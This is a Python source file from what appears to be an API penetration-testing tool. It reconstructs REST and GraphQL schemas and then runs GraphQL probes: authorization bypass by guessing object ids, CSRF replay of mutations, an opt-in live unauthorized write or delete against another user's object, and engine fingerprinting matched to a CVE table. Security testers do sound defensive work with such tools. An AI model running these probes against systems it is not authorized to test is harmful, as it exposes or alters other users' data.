    self_field = next((f for f in query_type.get("fields", [])
                        if f["name"].lower() in SELF_FIELD_NAMES and not f.get("args")), None)
    if not self_field or not self_field.get("type"):
        return None

    target_type = self_field["type"]
    for f in query_type.get("fields", []):
        if f["name"] == self_field["name"] or f.get("type") != target_type:
            continue
        id_arg = next((a for a in (f.get("args") or []) if "id" in a.lower()), None)
        if id_arg:
            return {"self_field": self_field["name"], "sibling_field": f["name"],
                    "id_arg": id_arg, "target_type": target_type}
    return None


def _extract_single_field_value(body, root_field, field_name):
    try:
        parsed = json.loads(body)
    except (json.JSONDecodeError, ValueError, TypeError):
        return None
    data = parsed.get("data") if isinstance(parsed, dict) else None
    root = data.get(root_field) if isinstance(data, dict) else None
    return root.get(field_name) if isinstance(root, dict) else None


def _extract_field_values(body, root_field, field_names):
    try:
        parsed = json.loads(body)
    except (json.JSONDecodeError, ValueError, TypeError):
        return None
    data = parsed.get("data") if isinstance(parsed, dict) else None
    root = data.get(root_field) if isinstance(data, dict) else None
    if not isinstance(root, dict):
        return None
    return {k: root.get(k) for k in field_names}


def test_graphql_nested_field_authz(url, schema, extra_headers=None, delay=0, candidate_ids=None):
    """Differential authz probe (graphql_techniques.md Inferences steps
    2-4): establish which generic candidate field names are real AND
    non-null on the type via the presumptively-correctly-gated self-field
    (control, one field at a time -- an unknown field invalidates a whole
    GraphQL selection set, so this can't be done as a single combined
    query), then re-query that SAME validated field set through the
    sibling by-ID field with a DIFFERENT id (test). Any field that comes
    back non-null via the sibling but was null/absent via self is a
    confirmed object/field-level authz finding. Fields in
    SENSITIVE_FIELD_NAMES are reported at "high" confidence; any other
    mismatch is still reported, at "medium" confidence, since a null-vs-
    populated scalar can also just mean the other user's record happens
    to have that field filled in rather than a real gating bug."""
    log("Testing GraphQL nested-field authorization (self vs. by-ID sibling)...")
    findings = []
    headers = {"Content-Type": "application/json"}
    if extra_headers:
        headers.update(extra_headers)

    pair = _find_self_and_sibling_fields(schema)
    if not pair:
        log("No self-field/by-ID-sibling pair found in reconstructed schema -- skipping")
        return findings
    self_field, sibling_field, id_arg = pair["self_field"], pair["sibling_field"], pair["id_arg"]

    valid_fields = {}
    for candidate in PROBE_FIELDS:  # "id" is already PROBE_FIELDS[0]
        status, _, body = http_request(url, "POST", headers,
                                        json.dumps({"query": f"{{ {self_field} {{ {candidate} }} }}"}))
        if delay:
            time.sleep(delay)
        if status == 0 or _UNKNOWN_FIELD_ERROR.search(body or ""):
            continue
        valid_fields[candidate] = _extract_single_field_value(body, self_field, candidate)

    if not valid_fields:
        log(f"Could not validate any candidate field against '{self_field}' -- skipping")
        return findings

    control_selection = " ".join(valid_fields.keys())
    control_non_null = {k for k, v in valid_fields.items() if v is not None}

    ids_to_try = list(dict.fromkeys(list(candidate_ids or []) + ["1", "2", "3", "0", "100"]))
    for test_id in ids_to_try:
        status, _, body = http_request(
            url, "POST", headers,
            json.dumps({"query": f'{{ {sibling_field}({id_arg}: "{test_id}") {{ {control_selection} }} }}'}))
        if delay:
            time.sleep(delay)
        if status == 0 or _UNKNOWN_FIELD_ERROR.search(body or ""):
            continue

        test_values = _extract_field_values(body, sibling_field, valid_fields.keys())
        if not test_values:
            continue

        leaked = {k: v for k, v in test_values.items() if v is not None and k not in control_non_null}
        if leaked:
            confidence = "high" if (set(leaked) & SENSITIVE_FIELD_NAMES) else "medium"
            vuln(f"GraphQL nested-field authz bypass: '{sibling_field}({id_arg}: \"{test_id}\")' "
                 f"exposed fields never seen via '{self_field}': {sorted(leaked)}")
            findings.append({
                "type": "graphql_bola_nested_field", "severity": "high",
                "url": url, "self_field": self_field, "sibling_field": sibling_field,
                "id_argument": id_arg, "tested_id": test_id,
                "fields_exposed_via_sibling_only": sorted(leaked), "confidence": confidence,
                "evidence": f"'{sibling_field}({id_arg}: \"{test_id}\")' returned {sorted(leaked)} "
                            f"using the caller's OWN session -- these fields were never exposed by "
                            f"the presumptively-gated '{self_field}' self-field for the caller's own "
                            f"data (confidence={confidence}: a null-vs-populated scalar can also just "
                            f"mean the other record happens to have that field filled in).",
            })

    return findings


def _looks_like_error(body):
    """True when a GraphQL response body carries a top-level 'errors'
    array, empty/null data, or isn't parseable -- i.e. a mutation did NOT
    visibly apply."""
    try:
        parsed = json.loads(body)
    except (json.JSONDecodeError, ValueError, TypeError):
        return True
    if not isinstance(parsed, dict):
        return True
    if parsed.get("errors"):
        return True
    return parsed.get("data") in (None, {})


def test_graphql_csrf(url, mutation_field, mutation_args=None, cookie_header=None, delay=0):
    """GraphQL CSRF probe (graphql_techniques.md nested-field-authz
    Inferences step 7 / Doyensec canonical class): resend a discovered
    state-changing mutation as GET with the query in the querystring, and
    as form-encoded POST, both with NO CSRF token and no custom header a
    normal client would send. cookie_header, when given, simulates the
    ONE ambient credential a true cross-site request could still carry (a
    session cookie a browser attaches automatically); an Authorization
    bearer token is deliberately never included here, since a cross-site
    request can't carry one without script/same-origin access -- that
    would test something else (no-auth-required), not CSRF. A 200 with
    the mutation actually applied on either transport is a finding."""
    log(f"Testing GraphQL CSRF on mutation '{mutation_field}'...")
    findings = []

    args_str = ", ".join(f"{k}: {json.dumps(v)}" for k, v in (mutation_args or {}).items())
    mutation_query = (f"mutation {{ {mutation_field}({args_str}) {{ __typename }} }}" if args_str
                       else f"mutation {{ {mutation_field} {{ __typename }} }}")
    ambient_headers = {"Cookie": cookie_header} if cookie_header else {}

    get_url = url + ("&" if "?" in url else "?") + urllib.parse.urlencode({"query": mutation_query})
    status_get, _, body_get = http_request(get_url, "GET", dict(ambient_headers))
    if delay:
        time.sleep(delay)
    if status_get == 200 and not _looks_like_error(body_get):
        vuln(f"GraphQL CSRF: mutation '{mutation_field}' executed via GET, no CSRF token")
        findings.append({
            "type": "graphql_csrf_mutation", "severity": "high", "url": get_url,
            "transport": "GET_querystring", "mutation_field": mutation_field,
            "evidence": f"GET {url}?query=... executed mutation '{mutation_field}' with no CSRF "
                        f"token and no custom header -- a cross-site GET (e.g. <img src>) could "
                        f"trigger this.",
        })

    form_headers = dict(ambient_headers)
    form_headers["Content-Type"] = "application/x-www-form-urlencoded"
    form_body = urllib.parse.urlencode({"query": mutation_query})
    status_post, _, body_post = http_request(url, "POST", form_headers, form_body)
    if delay:
        time.sleep(delay)
    if status_post == 200 and not _looks_like_error(body_post):
        vuln(f"GraphQL CSRF: mutation '{mutation_field}' executed via form-encoded POST, no token")
        findings.append({
            "type": "graphql_csrf_mutation", "severity": "high", "url": url,
            "transport": "POST_form_urlencoded", "mutation_field": mutation_field,
            "evidence": f"POST {url} (Content-Type: application/x-www-form-urlencoded) executed "
                        f"mutation '{mutation_field}' with no CSRF token -- an auto-submitting "
                        f"cross-site <form> could trigger this.",
        })

    return findings


def test_graphql_mutation_bola_write(url, mutation_field, id_arg, target_id, extra_headers=None,
                                      delay=0, write_payload=None, allow_write=False):
    """Opt-in-gated write-side BOLA probe (graphql_techniques.md nested-
    field-authz Inferences step 5): call a discovered update*/delete*/
    cancel*/set* mutation AS THE CALLER against an object id believed to
    belong to someone else, and check for a success signal rather than an
    authorization error. A true positive here is a REAL unauthorized
    write -- allow_write must be explicitly opted into by the invoker
    (schema_builder.py's own CLI only sets it from a dedicated
    --allow-mutation-write flag), and the caller is expected to have a
    pre-agreed test object before enabling this."""
    if not allow_write:
        log(f"Mutation-BOLA write probe for '{mutation_field}' skipped -- requires explicit opt-in "
            f"(--allow-mutation-write), since a true positive is a real unauthorized write")
        return []

    log(f"Testing mutation-BOLA write: '{mutation_field}' against id={target_id!r} (OPT-IN, LIVE WRITE)...")
    findings = []
    headers = {"Content-Type": "application/json"}
    if extra_headers:
        headers.update(extra_headers)

    payload = dict(write_payload or {})
    payload[id_arg] = target_id
    args_str = ", ".join(f"{k}: {json.dumps(v)}" for k, v in payload.items())
    query = f"mutation {{ {mutation_field}({args_str}) {{ __typename }} }}"

    status, _, body = http_request(url, "POST", headers, json.dumps({"query": query}))
    if delay:
        time.sleep(delay)

    if status == 200 and not _looks_like_error(body):
        vuln(f"Mutation-BOLA: '{mutation_field}' against id={target_id!r} SUCCEEDED with caller's own session")
        findings.append({
            "type": "graphql_mutation_bola_write", "severity": "critical", "url": url,
            "mutation_field": mutation_field, "id_argument": id_arg, "target_id": target_id,
            "evidence": f"mutation {{ {mutation_field}({id_arg}: \"{target_id}\") }} returned success "
                        f"(no authorization error) using the caller's own session against an object "
                        f"id believed to belong to a different user. REAL WRITE -- not a dry run.",
        })
    return findings


# --- Priority 3 helper: auto-discover a write mutation to target for the
# CSRF probe and the opt-in mutation-BOLA-write probe -------------------

MUTATION_BOLA_PREFIXES = ("update", "delete", "cancel", "set", "remove")


def _find_mutation_bola_candidates(schema):
    """Scan a reconstructed schema's Mutation type for update*/delete*/
    cancel*/set*/remove* fields taking an ID-shaped argument --
    graphql_techniques.md nested-field-authz Inferences step 5 (shared
    with the CSRF probe's own 'discovered state-changing mutation' step
    7, since both need the same kind of target)."""
    if not schema or not schema.get("types"):
        return []
    mutation_type = next((t for t in schema["types"] if t["name"].lower() == "mutation"), None)
    if not mutation_type:
        return []
    candidates = []
    for f in mutation_type.get("fields", []):
        if not f["name"].lower().startswith(MUTATION_BOLA_PREFIXES):
            continue
        id_arg = next((a for a in (f.get("args") or []) if "id" in a.lower()), None)
        if id_arg:
            candidates.append({"mutation_field": f["name"], "id_arg": id_arg})
    return candidates


# --- Priority 4: engine fingerprinting + version-aware CVE hypothesis
# (graphql_techniques.md "Named CVEs / real 2024-2026 GraphQL-
# implementation vulnerabilities") --------------------------------------

def fingerprint_graphql_engine(url, extra_headers=None, delay=0):
    """Distinguish Apollo / graphql-java / Hasura from response headers
    and error-shape alone (graphql_techniques.md CVE-section Inferences).
    This is a best-effort, low-confidence heuristic -- no primary source
    documents a canonical fingerprint signature set for this (the research
    only confirms engine-fingerprinting as a capability category via a
    tooling announcement, not published signatures) -- so this is pure
    signal collection, not a finding by itself, same as auth_analyzer.py's
    jwt_info isn't itself a finding. Returns a bare engine-name string."""
    log("Fingerprinting GraphQL engine...")
    headers = {"Content-Type": "application/json"}
    if extra_headers:
        headers.update(extra_headers)

    status, resp_headers, body = http_request(url, "POST", headers,
                                                json.dumps({"query": "{ __typename(badarg: 1) }"}))
    if delay:
        time.sleep(delay)

    header_keys_lower = {k.lower() for k in (resp_headers or {}).keys()}
    if any(k.startswith("x-hasura") for k in header_keys_lower):
        return "hasura"
    if "apollo-require-preflight" in header_keys_lower or "x-apollo-tracing" in header_keys_lower:
        return "apollo"

    body_lower = (body or "").lower()
    if "/v1/graphql" in url and "hasura" in body_lower:
        return "hasura"
    if "apollo" in body_lower:
        return "apollo"

    try:
        parsed = json.loads(body)
        errors = parsed.get("errors") if isinstance(parsed, dict) else None
        if errors and isinstance(errors, list) and isinstance(errors[0], dict):
            ext = errors[0].get("extensions", {})
            # graphql-java's distinctive error-extensions shape
            # (classification + path) without the literal string
            # "graphql-java" needing to appear anywhere -- a weaker,
            # shape-only signal than the header/string checks above.
            if isinstance(ext, dict) and "classification" in ext:
                return "graphql-java"
    except (json.JSONDecodeError, ValueError, TypeError):
        pass

    return "unknown"


# Version ranges are expressed as [(lo_inclusive, hi_exclusive), ...]
# tuples rather than one "fixed_version" scalar, because more than one of
# these engines ships parallel maintenance branches that were each patched
# independently (graphql-java: 19.11 / 20.9 / 21.5; Hasura: two disjoint
# ranges) -- a single fixed_version cutoff would wrongly flag an
# ALREADY-patched older branch (e.g. graphql-java 19.11) as vulnerable
# just because 19.x < 21.5 numerically. Every hit is a PRESUMPTIVE,
# version-matched hypothesis to confirm, never a confirmed CVE from
# black-box behavior alone -- same reliable static-table pattern as
# auth_analyzer.py's JWT_CVE_TABLE/check_jwt_cve_fingerprint, extended
# with range-aware comparison.
GRAPHQL_CVE_TABLE = [
    {"engine": "apollo", "cve": "CVE-2025-31496", "component": "apollo-compiler",
     "severity_if_matched": "high",
     "vulnerable_ranges": [((0, 0, 0), (1, 27, 0))],
     "note": "Named-fragment validation re-processed per spread (not per definition) with no "
             "memoization -- exponential validation cost for deeply-nested/reused fragments "
             "(GHSA-7mpv-9xg6-5r79). Fixed in apollo-compiler 1.27.0."},
    {"engine": "graphql-java", "cve": "CVE-2024-40094", "component": "graphql-java",
     "severity_if_matched": "medium",
     "vulnerable_ranges": [((0, 0), (19, 11)), ((20, 0), (20, 9)), ((21, 0), (21, 5))],
     "note": "Does not properly account for ExecutableNormalizedFields (ENFs) in its anti-DoS "
             "query-cost accounting -- a crafted alias/fragment-expanded query can evade it. "
             "Fixed in 19.11 / 20.9 / 21.5 (three parallel branches)."},
    {"engine": "hasura", "cve": "CVE-2026-54698", "component": "hasura-graphql-engine",
     "severity_if_matched": "medium",
     "vulnerable_ranges": [((2, 45, 0), (2, 45, 5)), ((2, 46, 0), (2, 49, 2))],
     "note": "Row-level-permission bypass via a where clause on a table computed field returning "
             "SETOF some_table (GHSA-r27x-gc74-qmxh)."},
]


def _version_in_ranges(parsed, ranges):
    for lo, hi in ranges:
        n = max(len(parsed), len(lo), len(hi))
        pad = lambda t: t + (0,) * (n - len(t))
        p, l, h = pad(parsed), pad(lo), pad(hi)
        if l <= p < h:
            return True
    return False


def check_graphql_cve_fingerprint(engine, version):
    """Static table + range-tuple version comparison, no network calls.
    Every hit is a version-matched HYPOTHESIS to verify, never a confirmed
    exploit -- this never attempts exploitation of any engine CVE."""
    norm = (engine or "").strip().lower()
    parsed = tuple(int(n) for n in re.findall(r'\d+', version or "")) or None
    hits = []
    for row in GRAPHQL_CVE_TABLE:
        if row["engine"] != norm:
            continue
        if parsed is None:
            verdict = "hypothesis_unknown_version"
        elif _version_in_ranges(parsed, row["vulnerable_ranges"]):
            verdict = "hypothesis_version_matched"
        else:
            verdict = "patched"
        hits.append({"cve": row["cve"], "component": row["component"], "engine": engine,
                     "version": version, "verdict": verdict, "note": row["note"],
                     "severity_if_matched": row["severity_if_matched"]})
    return hits


def test_graphql_cve_hypotheses(engine, version):
    """Wraps check_graphql_cve_fingerprint() as a findings-list-returning
    probe, matching this file's test_* convention. Only emits a finding
    for a version_matched/unversioned/unknown_version verdict -- "patched"
    produces no finding, same filtering auth_analyzer.py applies to its
    own JWT CVE table."""
    findings = []
    for hit in check_graphql_cve_fingerprint(engine, version):
        severity = {"hypothesis_version_matched": hit["severity_if_matched"],
                    "hypothesis_unversioned": "low",
                    "hypothesis_unknown_version": "low"}.get(hit["verdict"])
        if not severity:
            continue
        warn(f"GraphQL CVE hypothesis ({hit['verdict']}): {hit['cve']} ({hit['component']}) -- "
             f"PRESUMPTIVE, confirm version before reporting")
        findings.append({
            "type": "graphql_cvehypothesis", "severity": severity,
            "cve": hit["cve"], "component": hit["component"], "engine": engine, "version": version,
            "verdict": hit["verdict"],
            "evidence": f"{hit['note']} Verdict={hit['verdict']} -- PRESUMPTIVE from engine "
                        f"fingerprint + supplied version only; black-box behavior alone cannot "
                        f"confirm this CVE. Confirm the actual running version before reporting.",
        })
    return findings


def build_openapi_spec(base_url, endpoints, resources):
    """Build an OpenAPI 3.0 spec from discovered data."""
    spec = {
        "openapi": "3.0.0",
        "info": {
            "title": f"Reconstructed API Schema - {base_url}",
            "version": "1.0.0-reconstructed",
            "description": "Auto-reconstructed by api-breaker (orizon.one)",
        },
        "servers": [{"url": base_url}],
        "paths": {},
    }

    for ep in endpoints:
        path = ep.get("path", "")
        if path not in spec["paths"]:
            spec["paths"][path] = {}

        for method in ep.get("methods", ["get"]):
            method_lower = method.lower()
            entry = {
                "summary": f"Discovered {method} {path}",
                "responses": {
                    str(ep.get("status", 200)): {
                        "description": "Observed response",
                    }
                },
            }
            if ep.get("fields"):
                properties = {}
                for fname, ftype in ep["fields"].items():
                    properties[fname] = {"type": ftype}
                if method_lower in ("post", "put", "patch"):
                    entry["requestBody"] = {
                        "content": {
                            "application/json": {
                                "schema": {
                                    "type": "object",
                                    "properties": properties,
                                }
                            }
                        }
                    }
                else:
                    entry["parameters"] = [
                        {"name": fname, "in": "query", "schema": {"type": ftype}}
                        for fname, ftype in ep["fields"].items()
                    ]

            spec["paths"][path][method_lower] = entry

    return spec


def main():
    parser = argparse.ArgumentParser(description="Schema Builder - orizon.one")
    parser.add_argument("--input", "-i", help="Input JSON from api_discovery.py")
    parser.add_argument("--api-base", help="API base URL (alternative to --input)")
    parser.add_argument("--output", "-o", help="Output JSON file")
    parser.add_argument("--token", help="Auth token (Bearer)")
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--delay", type=float, default=0, help="Delay between requests (seconds)")
    parser.add_argument("--skip-graphql-depth-test", action="store_true",
                         help="Skip the GraphQL depth/complexity DoS and fragment-cycle probes")
    parser.add_argument("--skip-graphql-authz-test", action="store_true",
                         help="Skip the GraphQL nested-field authz and CSRF probes")
    parser.add_argument("--mutation-field", help="Explicit update*/delete*-style mutation name to target "
                         "for the CSRF probe / mutation-BOLA write probe (overrides schema auto-discovery)")
    parser.add_argument("--mutation-id-arg", default="id", help="Argument name the mutation takes for the "
                         "object id (default: id)")
    parser.add_argument("--mutation-target-id", help="Object id believed to belong to a DIFFERENT user, "
                         "used by the CSRF probe and required by --allow-mutation-write")
    parser.add_argument("--allow-mutation-write", action="store_true",
                         help="Opt-in: actually call the discovered update*/delete* mutation against "
                              "--mutation-target-id with the caller's own session. A true positive is a "
                              "REAL, LIVE unauthorized write -- off by default.")
    parser.add_argument("--candidate-ids", help="Comma-separated extra object ids to try in the nested-"
                         "field authz differential probe, in addition to the built-in small-integer seeds")
    parser.add_argument("--engine-version", help="Known/leaked GraphQL engine version string (from recon, "
                         "an error-message leak, a changelog, etc.) -- enables the static, version-aware "
                         "CVE hypothesis check against the auto-fingerprinted engine")
    args = parser.parse_args()

    if not args.input and not args.api_base:
        parser.error("Either --input or --api-base is required")

    extra_headers = {}
    if args.cookie:
        extra_headers["Cookie"] = args.cookie
    if args.token:
        extra_headers["Authorization"] = args.token if " " in args.token else f"Bearer {args.token}"

    base_url = args.api_base
    discovered_apis = []

    if args.input:
        log(f"Loading discovery data from {args.input}")
        with open(args.input) as f:
            discovery_data = json.load(f)
        base_url = base_url or discovery_data.get("meta", {}).get("base_url", "")
        discovered_apis = discovery_data.get("discovered_apis", [])

    log(f"Reconstructing API schema for: {base_url}")

    # Phase 1: Discover resources
    log("Phase 1: Discovering API resources...")
    resources = discover_resources(base_url, extra_headers, args.delay)

    # Phase 2: Discover methods and content types for each endpoint
    log("Phase 2: Probing HTTP methods and content types...")
    endpoints = []

    all_paths = set()
    for api in discovered_apis:
        all_paths.add(api.get("path", api.get("url", "")))
    for res in resources:
        all_paths.add(res.get("path", ""))

    for path in all_paths:
        if not path:
            continue
        url = urllib.parse.urljoin(base_url, path)
        log(f"Probing: {path}")

        methods = discover_methods(url, extra_headers, args.delay)
        content_types = probe_content_types(url, extra_headers, args.delay)

        endpoint = {
            "path": path,
            "url": url,
            "methods": methods,
            "content_types": content_types,
            "fields": {},
            "status": 0,
        }

        # Get fields from GET response
        if "GET" in methods:
            status, _, body = http_request(url, headers=extra_headers)
            if args.delay:
                time.sleep(args.delay)
            endpoint["status"] = status
            if status == 200:
                endpoint["fields"] = extract_fields_from_response(body)

        # Probe fields via error messages for POST/PUT
        writable_methods = [m for m in methods if m in ("POST", "PUT", "PATCH")]
        if writable_methods:
            error_fields = probe_fields_via_errors(url, writable_methods[0], extra_headers, args.delay)
            for k, v in error_fields.items():
                if k not in endpoint["fields"]:
                    endpoint["fields"][k] = v

        if methods:
            endpoints.append(endpoint)
            success(f"  Methods: {', '.join(methods)} | Fields: {len(endpoint['fields'])}")

    # Phase 3: Check for GraphQL
    graphql_schema = {}
    graphql_findings = []
    graphql_url = None
    for path in ["/graphql", "/api/graphql", "/v1/graphql"]:
        candidate_url = urllib.parse.urljoin(base_url, path)
        status, _, _ = http_request(candidate_url, method="POST", headers=extra_headers,
                                     data=json.dumps({"query": "{__typename}"}))
        if status in (200, 400):
            graphql_schema, graphql_findings = build_graphql_schema(candidate_url, extra_headers, args.delay)
            graphql_url = graphql_schema.get("endpoint_url", candidate_url)
            # Keep looking only if THIS path produced nothing useful at all
            # -- don't let a later, worse candidate path overwrite a good
            # blind-recovery result just because introspection itself
            # still came back disabled.
            if graphql_schema.get("introspection_enabled") or graphql_schema.get("harvested_fields"):
                break

    if graphql_url:
        log("Phase 3a: GraphQL engine fingerprinting...")
        engine = fingerprint_graphql_engine(graphql_url, extra_headers, args.delay)
        graphql_schema["engine"] = engine
        success(f"GraphQL engine fingerprint: {engine}")
        if args.engine_version:
            graphql_findings.extend(test_graphql_cve_hypotheses(engine, args.engine_version))

        if not args.skip_graphql_depth_test:
            log("Phase 3b: GraphQL depth/complexity DoS and fragment-cycle probes...")
            depth_findings, depth_threshold, depth_field_pair = test_graphql_depth_complexity_dos(
                graphql_url, graphql_schema, extra_headers, args.delay)
            graphql_findings.extend(depth_findings)

            if depth_threshold is not None and depth_field_pair:
                query_type_name = "Query"
                if graphql_schema.get("types"):
                    qtype = next((t["name"] for t in graphql_schema["types"] if t["name"].lower() == "query"), None)
                    query_type_name = qtype or "Query"
                graphql_findings.extend(test_graphql_introspection_naming_bypass(
                    graphql_url, depth_threshold, depth_field_pair, query_type_name,
                    extra_headers, args.delay))

            graphql_findings.extend(test_graphql_fragment_cycle(
                graphql_url, graphql_schema, extra_headers, args.delay))

        if not args.skip_graphql_authz_test:
            log("Phase 3c: GraphQL nested-field authorization and CSRF probes...")
            candidate_ids = [c.strip() for c in args.candidate_ids.split(",") if c.strip()] if args.candidate_ids else []
            graphql_findings.extend(test_graphql_nested_field_authz(
                graphql_url, graphql_schema, extra_headers, args.delay, candidate_ids))

            mutation_candidates = _find_mutation_bola_candidates(graphql_schema)
            if args.mutation_field:
                mutation_candidates.insert(0, {"mutation_field": args.mutation_field,
                                                "id_arg": args.mutation_id_arg or "id"})
            if mutation_candidates:
                target = mutation_candidates[0]
                cookie_header = args.cookie or None
                graphql_findings.extend(test_graphql_csrf(
                    graphql_url, target["mutation_field"],
                    {target["id_arg"]: args.mutation_target_id or "1"},
                    cookie_header, args.delay))

                if args.allow_mutation_write:
                    if not args.mutation_target_id:
                        warn("--allow-mutation-write set but --mutation-target-id missing -- "
                             "skipping mutation-BOLA write probe")
                    else:
                        graphql_findings.extend(test_graphql_mutation_bola_write(
                            graphql_url, target["mutation_field"], target["id_arg"],
                            args.mutation_target_id, extra_headers, args.delay,
                            allow_write=True))

    # Phase 4: Build OpenAPI spec
    log("Phase 4: Building OpenAPI specification...")
    openapi_spec = build_openapi_spec(base_url, endpoints, resources)

    # Count totals
    total_fields = sum(len(ep.get("fields", {})) for ep in endpoints)
    total_methods = sum(len(ep.get("methods", [])) for ep in endpoints)

    critical = [f for f in graphql_findings if f.get("severity") == "critical"]
    high = [f for f in graphql_findings if f.get("severity") == "high"]
    medium = [f for f in graphql_findings if f.get("severity") == "medium"]
    low_info = [f for f in graphql_findings if f.get("severity") in ("low", "info")]

    output = {
        "meta": {
            "base_url": base_url,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "schema_reconstruction",
            "tool": "api-breaker by orizon.one",
        },
        "stats": {
            "resources_discovered": len(resources),
            "endpoints_mapped": len(endpoints),
            "total_fields": total_fields,
            "total_methods": total_methods,
            "graphql_introspection": graphql_schema.get("introspection_enabled", False),
            "graphql_findings": len(graphql_findings),
            "graphql_findings_critical": len(critical),
            "graphql_findings_high": len(high),
            "graphql_findings_medium": len(medium),
            "graphql_findings_low_info": len(low_info),
        },
        "resources": resources,
        "endpoints": endpoints,
        "graphql_schema": graphql_schema,
        "openapi_spec": openapi_spec,
        "findings": graphql_findings,
    }

    domain = urllib.parse.urlparse(base_url).hostname or "unknown"
    output_path = args.output or f"schema_{domain.replace('.', '_')}.json"
    with open(output_path, "w") as f:
        json.dump(output, f, indent=2)
    success(f"Results saved to: {output_path}")

    print(f"\n{'='*60}")
    print(f"  SCHEMA RECONSTRUCTION SUMMARY - {base_url}")
    print(f"{'='*60}")
    print(f"  Resources discovered : {len(resources)}")
    print(f"  Endpoints mapped     : {len(endpoints)}")
    print(f"  Total fields found   : {total_fields}")
    print(f"  HTTP methods mapped  : {total_methods}")
    print(f"  GraphQL introspection: {graphql_schema.get('introspection_enabled', False)}")
    print(f"  GraphQL findings     : {len(graphql_findings)} (critical={len(critical)}, high={len(high)}, "
          f"medium={len(medium)}, low/info={len(low_info)})")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
